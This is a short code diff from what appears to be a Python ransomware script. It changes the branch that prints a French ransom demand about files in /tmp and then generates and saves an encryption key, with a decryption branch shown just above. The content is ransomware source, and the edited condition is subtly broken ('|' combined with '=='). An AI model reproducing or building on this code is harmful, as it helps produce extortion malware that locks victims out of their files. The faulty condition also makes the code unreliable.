@@ -124,7 +124,7 @@ if __name__ == '__main__':
         else:
             rware.read_key(keyfile)
             rware.crypt_tmp(local_tmp, encrypted=True)
-    else: #action == 'encrypt'
+    elif action == 'encrypt' | action == None:
         print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp")    
         rware.generate_key()
         rware.write_key('keyfile')
